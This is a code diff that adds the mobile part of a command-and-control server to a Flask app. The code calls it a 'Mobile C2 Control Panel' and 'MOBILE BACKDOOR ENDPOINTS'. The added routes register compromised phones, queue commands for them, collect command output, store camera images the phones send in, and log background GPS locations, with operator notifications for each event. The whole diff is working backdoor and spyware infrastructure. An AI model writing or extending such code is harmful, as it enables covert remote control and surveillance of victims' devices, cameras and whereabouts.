@@ -130,6 +130,14 @@ def panel():
     return render_template('panel.html', username=session.get('IAm-logined'))
 
 
+@app.route('/mobile_control')
+def mobile_control():
+    """Mobile C2 Control Panel"""
+    if not session.get('IAm-logined'):
+        return redirect(url_for('login'))
+    return render_template('mobile_control.html')
+
+
 @app.route('/logout')
 def logout():
     session.clear()
@@ -920,6 +928,212 @@ def c2_file_download_response():
         }
     
     return jsonify({'status': 'received'})
+
+
+# ===== MOBILE BACKDOOR ENDPOINTS =====
+
+# Global Mobile State
+MOBILE_SESSIONS = {}
+MOBILE_COMMANDS = {}
+MOBILE_RESPONSES = {}
+MOBILE_CAMERA_IMAGES = {}
+
+@app.route('/api/mobile/register', methods=['POST'])
+def mobile_register():
+    """Register a new mobile client"""
+    data = request.json
+    uid = data.get('uid')
+    info = data.get('info', {})
+    
+    MOBILE_SESSIONS[uid] = {
+        'last_seen': datetime.now().isoformat(),
+        'info': info,
+        'ip': request.remote_addr,
+        'registered_at': datetime.now().isoformat()
+    }
+    
+    # Initialize queues if new
+    if uid not in MOBILE_COMMANDS:
+        MOBILE_COMMANDS[uid] = []
+    if uid not in MOBILE_RESPONSES:
+        MOBILE_RESPONSES[uid] = []
+    
+    # Send notification
+    send_notification({
+        "type": "Mobile Device Connected",
+        "uid": uid,
+        "platform": info.get('platform', 'Unknown'),
+        "userAgent": info.get('userAgent', 'Unknown'),
+        "timestamp": datetime.now().isoformat()
+    })
+    
+    return jsonify({'status': 'registered'})
+
+@app.route('/api/mobile/poll', methods=['POST'])
+def mobile_poll():
+    """Mobile client polls for commands"""
+    data = request.json
+    uid = data.get('uid')
+    
+    if uid in MOBILE_SESSIONS:
+        MOBILE_SESSIONS[uid]['last_seen'] = datetime.now().isoformat()
+    
+    # Check for commands
+    if uid in MOBILE_COMMANDS and len(MOBILE_COMMANDS[uid]) > 0:
+        cmd = MOBILE_COMMANDS[uid].pop(0)
+        return jsonify({'command': cmd})
+    
+    return jsonify({'command': None})
+
+@app.route('/api/mobile/response', methods=['POST'])
+def mobile_response():
+    """Mobile client sends command response"""
+    data = request.json
+    uid = data.get('uid')
+    output = data.get('output')
+    
+    if uid:
+        if uid not in MOBILE_RESPONSES:
+            MOBILE_RESPONSES[uid] = []
+        MOBILE_RESPONSES[uid].append({
+            'output': output,
+            'timestamp': datetime.now().isoformat()
+        })
+    
+    return jsonify({'status': 'received'})
+
+@app.route('/api/mobile/camera', methods=['POST'])
+def mobile_camera():
+    """Mobile client sends camera capture"""
+    data = request.json
+    uid = data.get('uid')
+    image_data = data.get('image')
+    
+    if uid and image_data:
+        try:
+            # Clean up headers if present
+            if ',' in image_data:
+                image_data = image_data.split(',')[1]
+            
+            decoded_data = base64.b64decode(image_data)
+            fname = 'mobile_' + datetime.utcnow().strftime('%d%Y%H%M%S') + '.jpg'
+            images_dir = os.path.join(BASE_DIR, 'images')
+            os.makedirs(images_dir, exist_ok=True)
+            imgpath = os.path.join(images_dir, fname)
+            
+            with open(imgpath, 'wb') as f:
+                f.write(decoded_data)
+            
+            # Store reference
+            MOBILE_CAMERA_IMAGES[uid] = fname
+            
+            # Send notification
+            send_notification({
+                "type": "Mobile Camera Capture",
+                "uid": uid,
+                "filename": fname,
+                "timestamp": datetime.now().isoformat()
+            })
+            
+            return jsonify({'status': 'saved', 'filename': fname})
+        except Exception as e:
+            return jsonify({'error': str(e)}), 500
+    
+    return jsonify({'error': 'Invalid data'}), 400
+
+@app.route('/api/mobile/clients', methods=['GET'])
+def mobile_clients():
+    """Get list of connected mobile clients"""
+    clients = []
+    now = datetime.now()
+    
+    for uid, session in MOBILE_SESSIONS.items():
+        try:
+            last_seen = datetime.fromisoformat(session['last_seen'])
+            seconds_ago = (now - last_seen).total_seconds()
+            
+            # Consider active if seen in last 60 seconds
+            if seconds_ago < 60:
+                clients.append({
+                    'uid': uid,
+                    'info': session['info'],
+                    'ip': session['ip'],
+                    'last_seen': session['last_seen'],
+                    'seconds_ago': int(seconds_ago)
+                })
+        except:
+            pass
+    
+    return jsonify({'clients': clients})
+
+@app.route('/api/mobile/send_command', methods=['POST'])
+def mobile_send_command():
+    """Send command to mobile client"""
+    data = request.json
+    uid = data.get('uid')
+    command = data.get('command')
+    
+    if uid and command:
+        if uid not in MOBILE_COMMANDS:
+            MOBILE_COMMANDS[uid] = []
+        MOBILE_COMMANDS[uid].append(command)
+        return jsonify({'status': 'queued'})
+    
+    return jsonify({'error': 'Invalid data'}), 400
+
+@app.route('/api/mobile/get_response/<uid>', methods=['GET'])
+def mobile_get_response(uid):
+    """Get latest response from mobile client"""
+    if uid in MOBILE_RESPONSES and len(MOBILE_RESPONSES[uid]) > 0:
+        response = MOBILE_RESPONSES[uid].pop(0)
+        return jsonify(response)
+    
+    return jsonify({'output': None})
+
+
+# Global tracking data storage
+MOBILE_TRACKING_DATA = {}
+
+@app.route('/api/mobile/background_data', methods=['POST'])
+def mobile_background_data():
+    """Receive background tracking data from mobile client"""
+    data = request.json
+    uid = data.get('uid')
+    tracking_data = data.get('data')
+    
+    if uid and tracking_data:
+        if uid not in MOBILE_TRACKING_DATA:
+            MOBILE_TRACKING_DATA[uid] = []
+        
+        # Store tracking data with timestamp
+        tracking_data['received_at'] = datetime.now().isoformat()
+        MOBILE_TRACKING_DATA[uid].append(tracking_data)
+        
+        # Keep only last 100 entries per device
+        if len(MOBILE_TRACKING_DATA[uid]) > 100:
+            MOBILE_TRACKING_DATA[uid] = MOBILE_TRACKING_DATA[uid][-100:]
+        
+        # Send notification for important events
+        if tracking_data.get('type') == 'background_location':
+            send_notification({
+                "type": "Mobile Location Update",
+                "uid": uid,
+                "latitude": tracking_data.get('latitude'),
+                "longitude": tracking_data.get('longitude'),
+                "timestamp": tracking_data.get('timestamp')
+            })
+        
+        return jsonify({'status': 'received'})
+    
+    return jsonify({'error': 'Invalid data'}), 400
+
+@app.route('/api/mobile/tracking_data/<uid>', methods=['GET'])
+def mobile_get_tracking_data(uid):
+    """Get tracking data for a specific mobile client"""
+    if uid in MOBILE_TRACKING_DATA:
+        return jsonify({'data': MOBILE_TRACKING_DATA[uid]})
+    
+    return jsonify({'data': []})
 
 
 if __name__ == '__main__':
